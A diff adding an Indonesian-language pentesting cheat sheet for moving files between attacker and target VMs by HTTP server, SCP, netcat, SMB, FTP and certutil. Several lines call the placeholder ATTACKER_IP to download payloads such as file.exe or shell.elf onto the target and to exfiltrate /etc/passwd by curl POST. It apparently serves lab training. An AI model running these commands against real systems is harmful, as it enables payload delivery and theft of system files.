@@ -1,0 +1,95 @@
+
+---
+
+# FILE TRANSFER ANTAR VM CHEATSHEET
+
+1. Python HTTP Server (dari attacker ke target)
+
+---
+
+Jalankan server di folder file berada:
+Python 3:
+cd /path/to/file
+python3 -m http.server 8080
+
+Python 2:
+python -m SimpleHTTPServer 8080
+
+Di target (Linux/Windows):
+wget http\://ATTACKER\_IP:8080/file.exe
+curl http\://ATTACKER\_IP:8080/file.exe -o file.exe
+
+2. SCP (Secure Copy, via SSH)
+
+---
+
+Dari attacker ke target (Linux):
+scp file.txt user\@TARGET\_IP:/home/user/
+
+Dari target ke attacker:
+scp user\@TARGET\_IP:/home/user/file.txt /tmp/
+
+Opsi -r untuk folder:
+scp -r folder/ user\@TARGET\_IP:/home/user/
+
+3. Netcat (nc)
+
+---
+
+Attacker sebagai penerima (listener):
+nc -lvnp 4444 > file.txt
+
+Target mengirim file:
+nc ATTACKER\_IP 4444 < file.txt
+
+Untuk kirim binary (gunakan -w untuk timeout):
+nc -w 3 ATTACKER\_IP 4444 < shell.elf
+
+4. SMB (Jika target Windows & attacker Linux)
+
+---
+
+Install smbclient di Kali (sudah ada default):
+smbclient //ATTACKER\_IP/share -U user
+
+Copy file ke share:
+put file.exe
+
+Ambil file dari share:
+get file.exe
+
+5. FTP Lokal (jika service ada)
+
+---
+
+Start FTP server (vsftpd/pure-ftpd).
+Upload file ke target:
+ftp ATTACKER\_IP
+put file.txt
+
+Download file dari attacker:
+ftp ATTACKER\_IP
+get file.txt
+
+6. HTTP Upload via Curl (jika target bisa kirim balik)
+
+---
+
+Di attacker (jalankan listener):
+nc -lvnp 8080 > received.txt
+
+Di target:
+curl -X POST --data-binary @/etc/passwd http\://ATTACKER\_IP:8080
+
+7. Tips Praktis
+
+---
+
+* Python HTTP server → paling cepat untuk download file dari attacker.
+* Netcat → universal (transfer file 1 arah, raw).
+* SCP → paling aman, butuh SSH.
+* Jika target Windows → gunakan certutil untuk download:
+  certutil -urlcache -split -f http\://ATTACKER\_IP:8080/file.exe file.exe
+* Selalu cek koneksi antar VM dengan ping sebelum transfer.
+
+---
